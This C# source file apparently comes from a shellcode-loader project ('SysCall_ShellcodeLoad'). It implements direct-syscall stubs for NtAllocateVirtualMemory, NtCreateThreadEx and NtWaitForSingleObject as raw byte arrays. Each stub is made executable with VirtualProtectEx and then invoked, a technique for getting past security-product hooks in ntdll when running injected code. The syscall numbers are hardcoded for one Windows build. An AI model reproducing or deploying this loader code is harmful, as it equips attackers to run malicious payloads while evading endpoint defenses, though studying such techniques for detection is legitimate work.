using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Diagnostics;

namespace SysCall_ShellcodeLoad
{
    
    class NativeCode
    {
        public uint NTSTATUS;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        public enum AllocationType : ulong
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }


        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx
        (
            IntPtr hProcess, 
            IntPtr lpAddress, 
            UIntPtr dwSize, 
            uint flNewProtect, 
            out uint lpflOldProtect
         );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        /*
            ntdll!NtAllocateVirtualMemory:
            00007ffc`7a50d110 4c8bd1          mov     r10,rcx
            00007ffc`7a50d113 b818000000      mov     eax,18h
            00007ffc`7a50d118 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
            00007ffc`7a50d120 7503            jne     ntdll!NtAllocateVirtualMemory+0x15 (00007ffc`7a50d125)
            00007ffc`7a50d122 0f05            syscall
            00007ffc`7a50d124 c3              ret
            00007ffc`7a50d125 cd2e            int     2Eh
            00007ffc`7a50d127 c3              ret
        */

        static byte[] CuNtAVM =
        {
            0x4c, 0x8b, 0xd1,               // mov r10,rcx
            0xb8, 0x18, 0x00, 0x00, 0x00,   // mov eax,18h
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        public static uint NtAllocateVirtualMemory
        (
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref UIntPtr RegionSize,
            uint AllocationType,
            uint Protect)
        {
            // set byte array of bNtAllocateVirtualMemory to new byte array called syscall
            byte[] syscall = CuNtAVM;

            // specify unsafe context
            unsafe
            {
                // create new byte pointer and set value to our syscall byte array
                fixed (byte* ptr = syscall)
                {
                    // cast the byte array pointer into a C# IntPtr called memoryAddress
                    IntPtr memoryAddress = (IntPtr)ptr;

                    // Change memory access to RX for our assembly code
                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    // Get delegate for NtAllocateVirtualMemory
                    DelegatesStruct.NtAllocateVirtualMemory assembledFunction = (DelegatesStruct.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtAllocateVirtualMemory));

                    return (uint)assembledFunction(
                        ProcessHandle,
                        ref BaseAddress,
                        ZeroBits,
                        ref RegionSize,
                        AllocationType,
                        Protect);
                }
            }

        }

        /*
            ntdll!NtCreateThreadEx:
            00007ffc`7a50e620 4c8bd1 mov     r10,rcx
            00007ffc`7a50e623 b8c1000000      mov eax,0C1h
            00007ffc`7a50e628 f604250803fe7f01 test byte ptr[SharedUserData + 0x308(00000000`7ffe0308)],1
            00007ffc`7a50e630 7503            jne ntdll!NtCreateThreadEx+0x15 (00007ffc`7a50e635)
            00007ffc`7a50e632 0f05            syscall
            00007ffc`7a50e634 c3              ret
        */

        static byte[] CuNtCT =
        {
            0x4c, 0x8b, 0xd1,               // mov r10,rcx
            0xb8, 0xc1, 0x00, 0x00, 0x00,   // mov eax,c1h
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        public static uint NtCreateThreadEx
        (
            out IntPtr hThread,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool CreateSuspended,
            uint StackZeroBits,
            uint SizeOfStackCommit,
            uint SizeOfStackReserve,
            IntPtr lpBytesBuffer
        )
        {
            // set byte array of bNtCreateThread to new byte array called syscall
            byte[] syscall = CuNtCT;

            // specify unsafe context
            unsafe
            {
                // create new byte pointer and set value to our syscall byte array
                fixed (byte* ptr = syscall)
                {
                    // cast the byte array pointer into a C# IntPtr called memoryAddress
                    IntPtr memoryAddress = (IntPtr)ptr;

                    // Change memory access to RX for our assembly code
                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    // Get delegate for NtCreateThread
                    DelegatesStruct.NtCreateThreadEx assembledFunction = (DelegatesStruct.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtCreateThreadEx));

                    return (uint)assembledFunction(
                        out hThread,
                        DesiredAccess,
                        ObjectAttributes,
                        ProcessHandle,
                        lpStartAddress,
                        lpParameter,
                        CreateSuspended,
                        StackZeroBits,
                        SizeOfStackCommit,
                        SizeOfStackReserve,
                        lpBytesBuffer
                     );
                }
            }
        }

        /*
            ntdll!NtWaitForSingleObject:
            00007ffc`7a50ce90 4c8bd1          mov     r10,rcx
            00007ffc`7a50ce93 b804000000      mov     eax,4
            00007ffc`7a50ce98 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
            00007ffc`7a50cea0 7503            jne     ntdll!NtWaitForSingleObject+0x15 (00007ffc`7a50cea5)
            00007ffc`7a50cea2 0f05            syscall
            00007ffc`7a50cea4 c3              ret
        */
        static byte[] CuNtWFSO =
        {
            0x4c, 0x8b, 0xd1,               // mov r10,rcx
            0xb8, 0x04, 0x00, 0x00, 0x00,   // mov eax,04h
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        public static uint NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)
        {
            // set byte array of bNtWaitForSingleObject to new byte array called syscall
            byte[] syscall = CuNtWFSO;

            // specify unsafe context
            unsafe
            {
                // create new byte pointer and set value to our syscall byte array
                fixed (byte* ptr = syscall)
                {
                    // cast the byte array pointer into a C# IntPtr called memoryAddress
                    IntPtr memoryAddress = (IntPtr)ptr;

                    // Change memory access to RX for our assembly code
                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    // Get delegate for NtWaitForSingleObject
                    DelegatesStruct.NtWaitForSingleObject assembledFunction = (DelegatesStruct.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtWaitForSingleObject));

                    return (uint)assembledFunction(Object, Alertable, Timeout);
                }
            }
        }

        
        public struct DelegatesStruct
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtAllocateVirtualMemory(
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                IntPtr ZeroBits,
                ref UIntPtr RegionSize,
                ulong AllocationType,
                ulong Protect);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtCreateThreadEx(
                out IntPtr hThread,
                uint DesiredAccess,
                IntPtr ObjectAttributes,
                IntPtr ProcessHandle,
                IntPtr lpStartAddress,
                IntPtr lpParameter,
                bool CreateSuspended,
                uint StackZeroBits,
                uint SizeOfStackCommit,
                uint SizeOfStackReserve,
                IntPtr lpBytesBuffer
                );
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);
        }

       
    }

   
}
